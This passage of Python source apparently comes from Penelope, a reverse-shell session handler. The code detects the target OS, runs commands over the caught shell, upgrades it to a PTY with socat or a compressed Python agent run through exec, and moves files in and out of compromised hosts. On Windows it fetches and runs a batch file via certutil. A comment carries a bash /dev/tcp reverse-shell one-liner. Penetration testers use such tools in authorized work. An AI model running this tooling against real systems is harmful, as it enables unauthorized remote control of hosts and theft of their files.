					self.win_version = win_version[1]

			elif f"The term '{var_name1}={var_value1}' is not recognized as the name of a cmdlet" in response or \
					re.search('PS.*>', response, re.DOTALL):
				self.OS = 'Windows'
				self.type = 'Raw'
				self.subtype = 'psh'
				self.interactive = True
				self.echoing = False
				self.prompt = response.splitlines()[-1].encode()

		else: #TODO check if it is needed
			def expect(data):
				try:
					data = data.decode()
				except:
					return False
				if var_value1 + var_value2 in data:
					return True

			response = self.exec(
				f"${var_name1}='{var_value1}'; ${var_name2}='{var_value2}'; echo ${var_name1}${var_name2}\r\n",
				raw=True,
				expect_func=expect
			)
			if not response:
				return False
			response = response.decode()

			if var_value1 + var_value2 in response:
				self.OS = 'Windows'
				self.type = 'Raw'
				self.subtype = 'psh'
				self.interactive = not var_value1 + var_value2 == response
				self.echoing = False
				self.prompt = response.splitlines()[-1].encode()
				if var_name1 in response and not f"echo ${var_name1}${var_name2}" in response:
					self.type = 'PTY'
					columns, lines = shutil.get_terminal_size()
					cmd = (
						f"$width={columns}; $height={lines}; "
						"$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height); "
						"$Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size "
						"-ArgumentList ($width, $height)"
					)
					self.exec(cmd)
					self.prompt = response.splitlines()[-2].encode()
				else:
					self.prompt = re.sub(var_value1.encode() + var_value2.encode(), b"", self.prompt)

		self.get_shell_info(silent=True)
		if self.tty:
			self.type = 'PTY'
		if self.type == 'PTY':
			self.pty_ready = True
		return True

	def exec(
		self,
		cmd=None, 		# The command line to run
		raw=False, 		# Delimiters
		value=False,		# Will use the output elsewhere?
		timeout=False,		# Timeout
		expect_func=None,	# Function that determines what to wait for in the response
		force_cmd=False,	# Execute cmd command from powershell
		separate=False,		# If true, send cmd via this method but receive with TLV method (agent)
					# --- Agent only args ---
		agent_typing=False,	# Simulate typing on shell
		python=False,		# Execute python command
		stdin_src=None,		# stdin stream source
		stdout_dst=None,	# stdout stream destination
		stderr_dst=None,	# stderr stream destination
		stdin_stream=None,	# stdin_stream object
		stdout_stream=None,	# stdout_stream object
		stderr_stream=None,	# stderr_stream object
		agent_control=None	# control queue
	):
		if caller() == 'session_end':
			value = True

		if self.agent and not agent_typing: # TODO environment will not be the same as shell
			if cmd:
				cmd = dedent(cmd)
				if value:
					buffer = io.BytesIO()
				timeout = options.short_timeout if value else None

				if not stdin_stream:
					stdin_stream = self.new_streamID
					if not stdin_stream:
						return
				if not stdout_stream:
					stdout_stream = self.new_streamID
					if not stdout_stream:
						return
				if not stderr_stream:
					stderr_stream = self.new_streamID
					if not stderr_stream:
						return

				_type = 'S'.encode() if not python else 'P'.encode()
				self.send(Messenger.message(
					Messenger.EXEC, _type +
					stdin_stream.id +
					stdout_stream.id +
					stderr_stream.id +
					cmd.encode()
				))
				logger.debug(cmd)
				#print(stdin_stream.id, stdout_stream.id, stderr_stream.id)

				rlist = []
				if stdin_src:
					rlist.append(stdin_src)
				if stdout_dst or value:
					rlist.append(stdout_stream)
				if stderr_dst or value:
					rlist.append(stderr_stream) # FIX
				if not rlist:
					return True

				#rlist = [self.subchannel.control, stdout_stream, stderr_stream]
				#if stdin_src:
				#	rlist.append(stdin_src)

				if not agent_control:
					agent_control = self.subchannel.control # TEMP
				rlist.append(agent_control)
				while rlist != [agent_control]:
					r, _, _ = select(rlist, [], [], timeout)
					timeout = None

					if not r:
						#stdin_stream.terminate()
						#stdout_stream.terminate()
						#stderr_stream.terminate()
						break # TODO need to clear everything first

					for readable in r:

						if readable is agent_control:
							command = agent_control.get()
							if command == 'stop':
								# TODO kill task here...
								break

						if readable is stdin_src:
							if hasattr(stdin_src, 'read'): # FIX
								data = stdin_src.read(options.network_buffer_size)
							elif hasattr(stdin_src, 'recv'):
								try:
									data = stdin_src.recv(options.network_buffer_size)
								except OSError:
									pass # TEEEEMP
							stdin_stream.write(data)
							if not data:
								#stdin_stream << b""
								rlist.remove(stdin_src)

						if readable is stdout_stream:
							data = readable.read(options.network_buffer_size)
							if value:
								buffer.write(data)
							elif stdout_dst:
								if hasattr(stdout_dst, 'write'): # FIX
									stdout_dst.write(data)
									stdout_dst.flush()
								elif hasattr(stdout_dst, 'sendall'):
									try:
										stdout_dst.sendall(data) # maybe broken pipe
										if not data:
											if stdout_dst in rlist:
												rlist.remove(stdout_dst)
									except:
										if stdout_dst in rlist:
											rlist.remove(stdout_dst)
							if not data:
								rlist.remove(readable)
								del self.streams[readable.id]

						if readable is stderr_stream:
							data = readable.read(options.network_buffer_size)
							if value:
								buffer.write(data)
							elif stderr_dst:
								if hasattr(stderr_dst, 'write'): # FIX
									stderr_dst.write(data)
									stderr_dst.flush()
								elif hasattr(stderr_dst, 'sendall'):
									try:
										stderr_dst.sendall(data) # maybe broken pipe
										if not data:
											if stderr_dst in rlist:
												rlist.remove(stderr_dst)
									except:
										if stderr_dst in rlist:
											rlist.remove(stderr_dst)
							if not data:
								rlist.remove(readable)
								del self.streams[readable.id]
					else:
						continue
					break

				stdin_stream << b"" # TOCHECK
				stdin_stream.write(b"")
				os.close(stdin_stream._read)
				del self.streams[stdin_stream.id]

				return buffer.getvalue().rstrip().decode() if value else True
			return None

		with self.lock:
			if self.need_control_session:
				args = locals()
				del args['self']
				try:
					response = self.control_session.exec(**args)
					return response
				except AttributeError: # No control session
					logger.error("Spawn MANUALLY a new shell for this session to operate properly")
					return None

			if not self or not self.subchannel.can_use:
				logger.debug("Exec: The session is killed")
				return False

			self.subchannel.control.clear()
			self.subchannel.active = True
			self.subchannel.result = None
			buffer = io.BytesIO()
			_start = time.perf_counter()

			# Constructing the payload
			if cmd is not None:
				if force_cmd and self.subtype == 'psh':
					cmd = f"cmd /c '{cmd}'"
				initial_cmd = cmd
				cmd = cmd.encode()

				if raw:
					if self.OS == 'Unix':
						echoed_cmd_regex = rb' ' + re.escape(cmd) + rb'\r?\n'
						cmd = b' ' + cmd + b'\n'

					elif self.OS == 'Windows':
						cmd = cmd + b'\r\n'
						echoed_cmd_regex = re.escape(cmd)
				else:
					token = [rand(10) for _ in range(4)]

					if self.OS == 'Unix':
						cmd = (
							f" {token[0]}={token[1]} {token[2]}={token[3]};"
							f"printf ${token[0]}${token[2]};"
							f"{cmd.decode()};"
							f"printf ${token[2]}${token[0]}\n".encode()
						)

					elif self.OS == 'Windows': # TODO fix logic
						if self.subtype == 'cmd':
							cmd = (
								f"set {token[0]}={token[1]}&set {token[2]}={token[3]}\r\n"
								f"echo %{token[0]}%%{token[2]}%&{cmd.decode()}&"
								f"echo %{token[2]}%%{token[0]}%\r\n".encode()
							)
						elif self.subtype == 'psh':
							cmd = (
								f"$env:{token[0]}=\"{token[1]}\";$env:{token[2]}=\"{token[3]}\"\r\n"
								f"echo $env:{token[0]}$env:{token[2]};{cmd.decode()};"
								f"echo $env:{token[2]}$env:{token[0]}\r\n".encode()
							)
						# TODO check the maxlength on powershell
						if self.subtype == 'cmd' and len(cmd) > MAX_CMD_PROMPT_LEN:
							logger.error(f"Max cmd prompt length: {MAX_CMD_PROMPT_LEN} characters")
							return False

					self.subchannel.pattern = re.compile(
						rf"{token[1]}{token[3]}(.*){token[3]}{token[1]}"
						rf"{'.' if self.interactive else ''}".encode(), re.DOTALL)

				logger.debug(f"\n\n{paint(f'Command for session {self.id}').YELLOW}: {initial_cmd}")
				logger.debug(f"{paint('Command sent').yellow}: {cmd.decode()}")
				if self.agent and agent_typing:
					cmd = Messenger.message(Messenger.SHELL, cmd)
				self.send(cmd)
				self.subchannel.allow_receive_shell_data = False # TODO

			data_timeout = options.short_timeout if timeout is False else timeout
			continuation_timeout = options.latency
			timeout = data_timeout

			last_data = time.perf_counter()
			need_check = False
			try:
				while self.subchannel.result is None:
					logger.debug(paint(f"Waiting for data (timeout={timeout})...").blue)
					readables, _, _ = select([self.subchannel.control, self.subchannel], [], [], timeout)

					if self.subchannel.control in readables:
						command = self.subchannel.control.get()
						logger.debug(f"Subchannel Control Queue: {command}")

						if command == 'stop':
							self.subchannel.result = False
							break

					if self.subchannel in readables:
						logger.debug(f"Latency: {time.perf_counter() - last_data}")
						last_data = time.perf_counter()

						data = self.subchannel.read()
						buffer.write(data)
						logger.debug(f"{paint('Received').GREEN} -> {data}")

						if timeout == data_timeout:
							timeout = continuation_timeout
							need_check = True

					else:
						if timeout == data_timeout:
							logger.debug(paint("TIMEOUT").RED)
							self.subchannel.result = False
							break
						else:
							need_check = True
							timeout = data_timeout

					if need_check:
						need_check = False

						if raw and self.echoing and cmd:
							result = buffer.getvalue()
							if re.search(echoed_cmd_regex + (b'.' if self.interactive else b''), result, re.DOTALL):
								self.subchannel.result = re.sub(echoed_cmd_regex, b'', result)
								break
							else:
								logger.debug("The echoable is not exhausted")
								continue
						if not raw:
							check = self.subchannel.pattern.search(buffer.getvalue())
							if check:
								logger.debug(paint('Got all data!').green)
								self.subchannel.result = check[1]
								break
							logger.debug(paint('We didn\'t get all data; continue receiving').yellow)

						elif expect_func:
							if expect_func(buffer.getvalue()):
								logger.debug(paint("The expected strings found in data").yellow)
								self.subchannel.result = buffer.getvalue()
							else:
								logger.debug(paint('No expected strings found in data. Receive again...').yellow)

						else:
							logger.debug(paint('Maybe got all data !?').yellow)
							self.subchannel.result = buffer.getvalue()
							break
			except:
				self.subchannel.can_use = False
				self.subchannel.result = False

			_stop = time.perf_counter()
			logger.debug(f"{paint('FINAL TIME: ').white_BLUE}{_stop - _start}")

			if value and self.subchannel.result is not False:
				self.subchannel.result = self.subchannel.result.strip().decode() # TODO check strip
			logger.debug(f"{paint('FINAL RESPONSE: ').white_BLUE}{self.subchannel.result}")
			self.subchannel.active = False

			if separate and self.subchannel.result:
				self.subchannel.result = re.search(rb"..\x01.*", self.subchannel.result, re.DOTALL)[0]
				buffer = io.BytesIO()
				for _type, _value in self.messenger.feed(self.subchannel.result):
					buffer.write(_value)
				return buffer.getvalue()

			return self.subchannel.result

	def need_binary(self, name, url):
		options = (
			f"\n  1) Upload {paint(url).blue}{paint().magenta}"
			f"\n  2) Upload local {name} binary"
			f"\n  3) Specify remote {name} binary path"
			 "\n  4) None of the above\n"
		)
		print(paint(options).magenta)
		answer = ask("Select action: ")

		if answer == "1":
			return self.upload(
				url,
				remote_path="/var/tmp",
				randomize_fname=False
			)[0]

		elif answer == "2":
			local_path = ask(f"Enter {name} local path: ")
			if local_path:
				if os.path.exists(local_path):
					return self.upload(
						local_path,
						remote_path=self.tmp,
						randomize_fname=False
					)[0]
				else:
					logger.error("The local path does not exist...")

		elif answer == "3":
			remote_path = ask(f"Enter {name} remote path: ")
			if remote_path:
				if not self.exec(f"test -f {remote_path} || echo x"):
					return remote_path
				else:
					logger.error("The remote path does not exist...")

		elif answer == "4":
			return False

		return self.need_binary(name, url)

	def upgrade(self):
		self.upgrade_attempted = True
		if self.OS == "Unix":
			if self.agent:
				logger.warning("Python Agent is already deployed")
				return False

			if self.host_needs_control_session and self.host_control_sessions == [self]:
				logger.warning("This is a control session and cannot be upgraded")
				return False

			if self.pty_ready:
				if self.can_deploy_agent:
					logger.info("Attempting to deploy Python Agent...")
				else:
					logger.warning("This shell is already PTY")
			else:
				logger.info("Attempting to upgrade shell to PTY...")

			self.shell = self.bin['bash'] or self.bin['sh']
			if not self.shell:
				logger.warning("Cannot detect shell. Abort upgrading...")
				return False

			if self.can_deploy_agent:
				_bin = self.bin['python3'] or self.bin['python']
				if self.remote_python_version >= (3,):
					_decode = 'b64decode'
					_exec = 'exec(cmd, globals(), locals())'
				else:
					_decode = 'decodestring'
					_exec = 'exec cmd in globals(), locals()'

				agent = dedent('\n'.join(AGENT.splitlines()[1:])).format(
					self.shell,
					options.network_buffer_size,
					MESSENGER,
					STREAM,
					self.bin['sh'] or self.bin['bash'],
					_exec
				)
				payload = base64.b64encode(compress(agent.encode(), 9)).decode()
				cmd = f'{_bin} -Wignore -c \'import base64,zlib;exec(zlib.decompress(base64.{_decode}("{payload}")))\''

			elif not self.pty_ready:
				socat_cmd = f"{{}} - exec:{self.shell},pty,stderr,setsid,sigint,sane;exit 0"
				if self.bin['script']:
					_bin = self.bin['script']
					cmd = f"{_bin} -q /dev/null; exit 0"

				elif self.bin['socat']:
					_bin = self.bin['socat']
					cmd = socat_cmd.format(_bin)

				else:
					_bin = "/var/tmp/socat"
					if not self.exec(f"test -f {_bin} || echo x"): # TODO maybe needs rstrip
						cmd = socat_cmd.format(_bin)
					else:
						logger.warning("Cannot upgrade shell with the available binaries...")
						socat_binary = self.need_binary("socat", URLS['socat'])
						if socat_binary:
							_bin = socat_binary
							cmd = socat_cmd.format(_bin)
						else:
							if readline:
								logger.info("Readline support enabled")
								self.type = 'Readline'
								return True
							else:
								logger.error("Falling back to Raw shell")
								return False

			if not self.can_deploy_agent and not self.spare_control_sessions:
				logger.warning("Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY")
				core.session_wait_host = self.name
				self.spawn()
				try:
					new_session = core.sessions[core.session_wait.get(timeout=options.short_timeout)]
					core.session_wait_host = None

				except queue.Empty:
					logger.error("Failed spawning new session")
					return False

				if self.pty_ready:
					return True

			if self.pty_ready:
				self.exec("stty -echo")
				self.echoing = False

			elif self.interactive:
				# Some shells are unstable in interactive mode
				# For example: <?php passthru("bash -i >& /dev/tcp/X.X.X.X/4444 0>&1"); ?>
				# Silently convert the shell to non-interactive before PTY upgrade.
				self.interactive = False
				self.echoing = True
				self.exec(f"exec {self.shell}", raw=True)
				self.echoing = False

			response = self.exec(
				f'export TERM=xterm-256color; export SHELL={self.shell}; {cmd}',
				separate=self.can_deploy_agent,
				expect_func=lambda data: not self.can_deploy_agent or b"\x01" in data,
				raw=True
			)
			if self.can_deploy_agent and not isinstance(response, bytes):
				logger.error("The shell became unresponsive. I am killing it, sorry... Next time I will not try to deploy agent")
				Path(self.directory / ".noagent").touch()
				self.kill()
				return False

			logger.info(f"Shell upgraded successfully using {paint(_bin).yellow}{paint().green}! 💪")

			self.agent = self.can_deploy_agent
			self.type = 'PTY'
			self.interactive = True
			self.echoing = True
			self.prompt = response

			self.get_shell_info()

			if _bin == self.bin['script']:
				self.exec("stty sane")

		elif self.OS == "Windows":
			if self.type != 'PTY':
				self.type = 'Readline'
				logger.info("Added readline support...")

		return True

	def update_pty_size(self):
		columns, lines = shutil.get_terminal_size()
		if self.OS == 'Unix':
			if self.agent:
				self.send(Messenger.message(Messenger.RESIZE, struct.pack("HH", lines, columns)))
			else: # TODO
				threading.Thread(
					target=self.exec,
					args=(f"stty rows {lines} columns {columns} < {self.tty}",),
					name="RESIZE"
				).start() #TEMP
		elif self.OS == 'Windows': # TODO
			pass

	def readline_loop(self):
		while core.attached_session == self:
			try:
				cmd = input("\033[s\033[u", self.histfile, options.histlength, None, "\t") # TODO
				if self.subtype == 'cmd':
					assert len(cmd) <= MAX_CMD_PROMPT_LEN
				#self.record(b"\n" + cmd.encode(), _input=True)

			except EOFError:
				self.detach()
				break
			except AssertionError:
				logger.error(f"Maximum prompt length is {MAX_CMD_PROMPT_LEN} characters. Current prompt is {len(cmd)}")
			else:
				self.send(cmd.encode() + b"\n")

	def attach(self):
		if threading.current_thread().name != 'Core':
			if self.new:
				upgrade_conditions = [
					not options.no_upgrade,
					not (self.need_control_session and self.host_control_sessions == [self]),
					not self.upgrade_attempted
				]
				if all(upgrade_conditions):
					self.upgrade()
				if self.prompt:
					self.record(self.prompt)
				self.new = False

			core.control << f'self.sessions[{self.id}].attach()'
			menu.active.clear() # Redundant but safeguard
			return True

		if core.attached_session is not None:
			return False

		if self.type == 'PTY':
			escape_key = options.escape['key']
		elif self.type == 'Readline':
			escape_key = 'Ctrl-D'
		else:
			escape_key = 'Ctrl-C'

		logger.info(
			f"Interacting with session {paint('[' + str(self.id) + ']').red}"
			f"{paint(', Shell Type:').green} {paint(self.type).CYAN}{paint(', Menu key:').green} "
			f"{paint(escape_key).MAGENTA} "
		)

		if not options.no_log:
			logger.info(f"Logging to {paint(self.logpath).yellow_DIM} 📜")
		print(paint('─').DIM * shutil.get_terminal_size()[0])

		core.attached_session = self
		core.rlist.append(sys.stdin)

		stdout(bytes(self.last_lines))

		if self.type == 'PTY':
			tty.setraw(sys.stdin)
			os.kill(os.getpid(), signal.SIGWINCH)

		elif self.type == 'Readline':
			threading.Thread(target=self.readline_loop).start()

		self._cwd = None
		return True

	def sync_cwd(self):
		self._cwd = None
		if self.agent:
			self.exec(f"os.chdir('{self.cwd}')", python=True, value=True)
		elif self.need_control_session:
			self.exec(f"cd {self.cwd}")

	def detach(self):
		if self and self.OS == 'Unix' and (self.agent or self.need_control_session):
			threading.Thread(target=self.sync_cwd).start()

		if threading.current_thread().name != 'Core':
			core.control << f'self.sessions[{self.id}].detach()'
			return

		if core.attached_session is None:
			return False

		core.wait_input = False
		core.attached_session = None
		core.rlist.remove(sys.stdin)

		if self.type == 'PTY':
			termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)

		if self.id in core.sessions:
			print()
			logger.warning("Session detached ⇲")
			menu.set_id(self.id)
		else:
			if options.single_session and not core.sessions:
				core.stop()
				logger.info("Penelope exited due to Single Session mode")
				return
			menu.set_id(None)
		menu.show()

		return True

	def download(self, remote_items):
		# Initialization
		try:
			shlex.split(remote_items) # Early check for shlex errors
		except ValueError as e:
			logger.error(e)
			return []

		local_download_folder = self.directory / "downloads"
		try:
			local_download_folder.mkdir(parents=True, exist_ok=True)
		except Exception as e:
			logger.error(e)
			return []

		if self.OS == 'Unix':
			# Check for local available space
			available_bytes = shutil.disk_usage(local_download_folder).free
			if self.agent:
				block_size = os.statvfs(local_download_folder).f_frsize
				response = self.exec(f"{GET_GLOB_SIZE}"
					f"stdout_stream << str(get_glob_size({repr(remote_items)}, {block_size})).encode()",
					python=True,
					value=True
				)
				try:
					remote_size = int(float(response))
				except:
					logger.error(response)
					return []
			else:
				cmd = f"du -ck {remote_items}"
				response = self.exec(cmd, timeout=None, value=True)
				if not response:
					logger.error("Cannot determine remote size")
					return []
				#errors = [line[4:] for line in response.splitlines() if line.startswith('du: ')]
				#for error in errors:
				#	logger.error(error)
				remote_size = int(response.splitlines()[-1].split()[0]) * 1024

			need = remote_size - available_bytes

			if need > 0:
				logger.error(
					f"--- Not enough space to download... {paint('We need ').blue}"
					f"{paint().yellow}{need:,}{paint().blue} more bytes..."
				)
				return []

			# Packing and downloading
			if self.agent:
				stdin_stream = self.new_streamID
				stdout_stream = self.new_streamID
				stderr_stream = self.new_streamID

				if not all([stdout_stream, stderr_stream]):
					return

				code = fr"""
				from glob import glob
				normalize_path = lambda path: os.path.normpath(os.path.expandvars(os.path.expanduser(path)))
				items = []
				for part in shlex.split({repr(remote_items)}):
					_items = glob(normalize_path(part))
					if _items:
						items.extend(_items)
					else:
						items.append(part)
				import tarfile
				if hasattr(tarfile, 'DEFAULT_FORMAT'):
					tarfile.DEFAULT_FORMAT = tarfile.PAX_FORMAT
				else:
					tarfile.TarFile.posix = True
				tar = tarfile.open(name="", mode='w|gz', fileobj=stdout_stream)
				def handle_exceptions(func):
					def inner(*args, **kwargs):
						try:
							func(*args, **kwargs)
						except:
							stderr_stream << (str(sys.exc_info()[1]) + '\n').encode()
					return inner
				tar.add = handle_exceptions(tar.add)
				for item in items:
					try:
						tar.add(os.path.abspath(item))
					except:
						stderr_stream << (str(sys.exc_info()[1]) + '\n').encode()
				tar.close()
				"""

				threading.Thread(target=self.exec, args=(code, ), kwargs={
					'python': True,
					'stdin_stream': stdin_stream,
					'stdout_stream': stdout_stream,
					'stderr_stream': stderr_stream
				}).start()

				error_buffer = ''
				while True:
					r, _, _ = select([stderr_stream], [], [])
					data = stderr_stream.read(options.network_buffer_size)
					if data:
						error_buffer += data.decode()
						while '\n' in error_buffer:
							line, error_buffer = error_buffer.split('\n', 1)
							logger.error(str(paint("<REMOTE>").cyan) + " " + str(paint(line).red))
					else:
						break

				tar_source, mode = stdout_stream, "r|gz"
			else:
				remote_items = ' '.join([os.path.join(self.cwd, part) for part in shlex.split(remote_items)])
				temp = self.tmp + "/" + rand(8)
				cmd = rf'tar -czf - -h {remote_items}|base64|tr -d "\n" > {temp}'
				response = self.exec(cmd, timeout=None, value=True)
				if response is False:
					logger.error("Cannot create archive")
					return []
				errors = [line[5:] for line in response.splitlines() if line.startswith('tar: /')]
				for error in errors:
					logger.error(error)
				send_size = int(self.exec(rf"(stat -x {temp} 2>/dev/null || stat {temp}) | sed -n 's/.*Size: \([0-9]*\).*/\1/p'"))

				b64data = io.BytesIO()
				for offset in range(0, send_size, options.download_chunk_size):
					response = self.exec(f"cut -c{offset + 1}-{offset + options.download_chunk_size} {temp}")
					if response is False:
						logger.error("Download interrupted")
						return []
					b64data.write(response)
				self.exec(f"rm {temp}")

				data = io.BytesIO()
				data.write(base64.b64decode(b64data.getvalue()))
				data.seek(0)

				tar_source, mode = data, "r:gz"

			#print(remote_size)
			#if not remote_size:
			#	return []

			# Local extraction
			try:
				tar = tarfile.open(mode=mode, fileobj=tar_source)
			except:
				logger.error("Invalid data returned")
				return []

			def add_w(func):
				def inner(*args, **kwargs):
					args[0].mode |= 0o200
					func(*args, **kwargs)
				return inner

			tar._extract_member = add_w(tar._extract_member)

			with warnings.catch_warnings():
				warnings.simplefilter("ignore", category=DeprecationWarning)
				try:
					tar.extractall(local_download_folder)
				except Exception as e:
					logger.error(str(paint("<LOCAL>").yellow) + " " + str(paint(e).red))
			tar.close()

			if self.agent:
				stdin_stream.write(b"")
				os.close(stdin_stream._read)
				os.close(stdin_stream._write)
				del self.streams[stdin_stream.id]
				os.close(stdout_stream._read)
				del self.streams[stdout_stream.id]
				del self.streams[stderr_stream.id]

				# Get the remote absolute paths
				response = self.exec(f"""
				from glob import glob
				normalize_path = lambda path: os.path.normpath(os.path.expandvars(os.path.expanduser(path)))
				remote_paths = ''
				for part in shlex.split({repr(remote_items)}):
					result = glob(normalize_path(part))
					if result:
						for item in result:
							if os.path.exists(item):
								remote_paths += os.path.abspath(item) + "\\n"
					else:
						remote_paths += part + "\\n"
				stdout_stream << remote_paths.encode()
				""", python=True, value=True)
			else:
				cmd = f'for file in {remote_items}; do if [ -e "$file" ]; then readlink -f "$file"; else echo "$file"; fi; done'
				response = self.exec(cmd, timeout=None, value=True)
				if not response:
					logger.error("Cannot get remote paths")
					return []

			remote_paths = response.splitlines()

			# Present the downloads
			downloaded = []
			for path in remote_paths:
				local_path = local_download_folder / path[1:]
				if os.path.isabs(path) and os.path.exists(local_path):
					downloaded.append(local_path)
				else:
					logger.error(f"{paint('Download Failed').RED_white} {shlex.quote(path)}")

		elif self.OS == 'Windows':
			remote_tempfile = f"{self.tmp}\\{rand(10)}.zip"
			tempfile_bat = f'/dev/shm/{rand(16)}.bat'
			remote_items_ps = r'\", \"'.join(shlex.split(remote_items))
			cmd = (
				f'@powershell -command "$archivepath=\'{remote_tempfile}\';compress-archive -path \'{remote_items_ps}\''
				' -DestinationPath $archivepath;'
				'$b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes($archivepath));'
				'Remove-Item $archivepath;'
				'Write-Host $b64"'
			)
			with open(tempfile_bat, "w") as f:
				f.write(cmd)

			server = FileServer(host=self._host, url_prefix=rand(8), quiet=True)
			urlpath_bat = server.add(tempfile_bat)
			temp_remote_file_bat = urlpath_bat.split("/")[-1]
			server.start()
			data = self.exec(
				f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" '
				f'"%TEMP%\\{temp_remote_file_bat}" >NUL 2>&1&"%TEMP%\\{temp_remote_file_bat}"&'
				f'del "%TEMP%\\{temp_remote_file_bat}"',
				force_cmd=True, value=True, timeout=None)
			server.stop()

			if not data:
				return []
			downloaded = set()
			try:
				with zipfile.ZipFile(io.BytesIO(base64.b64decode(data)), 'r') as zipdata:
					for item in zipdata.infolist():
						item.filename = item.filename.replace('\\', '/')
						downloaded.add(Path(local_download_folder) / Path(item.filename.split('/')[0]))
						newpath = Path(zipdata.extract(item, path=local_download_folder))

			except zipfile.BadZipFile:
				logger.error("Invalid zip format")

			except binascii_error:
				logger.error("The item does not exist or access is denied")

		for item in downloaded:
			logger.info(f"{paint('Download OK').GREEN_white} {paint(shlex.quote(pathlink(item))).yellow}")

		return downloaded

	def upload(self, local_items, remote_path=None, randomize_fname=False):

		# Check remote permissions
		destination = remote_path or self.cwd
		try:
			if self.OS == 'Unix':
				if self.agent:
					if not eval(self.exec(
						f"stdout_stream << str(os.access('{destination}', os.W_OK)).encode()",
						python=True,
						value=True
					)):
						logger.error(f"{destination}: Permission denied")
						return []
				else:
					if int(self.exec(f"[ -w \"{destination}\" ];echo $?", value=True)):
						logger.error(f"{destination}: Permission denied")
						return []
			elif self.OS == 'Windows':
				pass # TODO
		except Exception as e:
			logger.error(e)
			logger.warning("Cannot check remote permissions. Aborting...")
			return []

		# Initialization
		try:
			local_items = [item if re.match(r'(http|ftp)s?://', item, re.IGNORECASE)\
				 else normalize_path(item) for item in shlex.split(local_items)]

		except ValueError as e:
			logger.error(e)
			return []

		# Check for necessary binaries
		if self.OS == 'Unix' and not self.agent:
			dependencies = ['echo', 'base64', 'tar', 'rm']
			for binary in dependencies:
				if not self.bin[binary]:
					logger.error(f"'{binary}' binary is not available at the target. Cannot upload...")
					return []

		# Resolve items
		resolved_items = []
		for item in local_items:
			# Download URL
			if re.match(r'(http|ftp)s?://', item, re.IGNORECASE):
				try:
					filename, item = url_to_bytes(item)
					if not item:
						continue
					resolved_items.append((filename, item))
				except Exception as e:
					logger.error(e)
			else:
				if os.path.isabs(item):
					items = list(Path('/').glob(item.lstrip('/')))
				else:
					items = list(Path().glob(item))
				if items:
					resolved_items.extend(items)
				else:
					logger.error(f"No such file or directory: {item}")

		if not resolved_items:
			return []

		if self.OS == 'Unix':
			# Get remote available space
			if self.agent:
				response = self.exec(f"""
				stats = os.statvfs('{destination}')
				stdout_stream << (str(stats.f_bavail) + ';' + str(stats.f_frsize)).encode()
				""", python=True, value=True)

				remote_available_blocks, remote_block_size = map(int, response.split(';'))
				remote_space = remote_available_blocks * remote_block_size
			else:
				remote_block_size = int(self.exec(rf'stat -c "%o" {destination} 2>/dev/null || stat -f "%k" {destination}', value=True))
				remote_space = int(self.exec(f"df -k {destination}|tail -1|awk '{{print $4}}'", value=True)) * 1024

			# Calculate local size
			local_size = 0
			for item in resolved_items:
				if isinstance(item, tuple):
					local_size += ceil(len(item[1]) / remote_block_size) * remote_block_size
				else:
					local_size += get_glob_size(str(item), remote_block_size)

			# Check required space
			need = local_size - remote_space
			if need > 0:
				logger.error(
					f"--- Not enough space on target... {paint('We need ').blue}"
					f"{paint().yellow}{need:,}{paint().blue} more bytes..."
				)
				return []

			# Start Uploading
			if self.agent:
				stdin_stream = self.new_streamID
				stdout_stream = self.new_streamID
				stderr_stream = self.new_streamID

				if not all([stdin_stream, stderr_stream]):
					return

				code = rf"""
				import tarfile
				if hasattr(tarfile, 'DEFAULT_FORMAT'):
					tarfile.DEFAULT_FORMAT = tarfile.PAX_FORMAT
				else:
					tarfile.TarFile.posix = True
				tar = tarfile.open(name='', mode='r|gz', fileobj=stdin_stream)
				tar.errorlevel = 1
				for item in tar:
					try:
						tar.extract(item, path='{destination}')
					except:
						stderr_stream << (str(sys.exc_info()[1]) + '\n').encode()
				tar.close()
				"""
				threading.Thread(target=self.exec, args=(code, ), kwargs={
					'python': True,
					'stdin_stream': stdin_stream,
					'stdout_stream': stdout_stream,
					'stderr_stream': stderr_stream
				}).start()

				tar_destination, mode = stdin_stream, "r|gz"
			else:
				tar_buffer = io.BytesIO()
				tar_destination, mode = tar_buffer, "r:gz"

			tar = tarfile.open(mode='w|gz', fileobj=tar_destination)

			def handle_exceptions(func):
				def inner(*args, **kwargs):
					try:
						func(*args, **kwargs)
					except Exception as e:
						logger.error(str(paint("<LOCAL>").yellow) + " " + str(paint(e).red))
				return inner
			tar.add = handle_exceptions(tar.add)

			altnames = []
			for item in resolved_items:
				if isinstance(item, tuple):
					filename, data = item

					if randomize_fname:
						filename = Path(filename)
						altname = f"{filename.stem}-{rand(8)}{filename.suffix}"
					else:
						altname = filename

					file = tarfile.TarInfo(name=altname)
					file.size = len(data)
					file.mode = 0o770
					file.mtime = int(time.time())

					tar.addfile(file, io.BytesIO(data))
				else:
					altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
					tar.add(item, arcname=altname)
				altnames.append(altname)
			tar.close()

			if self.agent:
				stdin_stream.write(b"")
				error_buffer = ''
				while True:
					r, _, _ = select([stderr_stream], [], [])
					data = stderr_stream.read(options.network_buffer_size)
					if data:
						error_buffer += data.decode()
						while '\n' in error_buffer:
							line, error_buffer = error_buffer.split('\n', 1)
							logger.error(str(paint("<REMOTE>").cyan) + " " + str(paint(line).red))
					else:
						break
				os.close(stdin_stream._read)
				os.close(stdin_stream._write)
				os.close(stdout_stream._read)
				del self.streams[stdin_stream.id]
				del self.streams[stdout_stream.id]
				del self.streams[stderr_stream.id]

			else: # TODO
				tar_buffer.seek(0)
				data = base64.b64encode(tar_buffer.read()).decode()
				temp = self.tmp + "/" + rand(8)

				for chunk in chunks(data, options.upload_chunk_size):
					response = self.exec(f"printf {chunk} >> {temp}")
					if response is False:
						#progress_bar.terminate()
						logger.error("Upload interrupted")
						return [] # TODO
					#progress_bar.update(len(chunk))

				#logger.info(paint("--- Remote unpacking...").blue)
				dest = f"-C {remote_path}" if remote_path else ""
				cmd = f"base64 -d < {temp} | tar xz {dest} 2>&1; temp=$?"
				response = self.exec(cmd, value=True)
				exit_code = int(self.exec("echo $temp", value=True))
				self.exec(f"rm {temp}")
				if exit_code:
					logger.error(response)
					return [] # TODO

		elif self.OS == 'Windows':
			tempfile_zip = f'/dev/shm/{rand(16)}.zip'
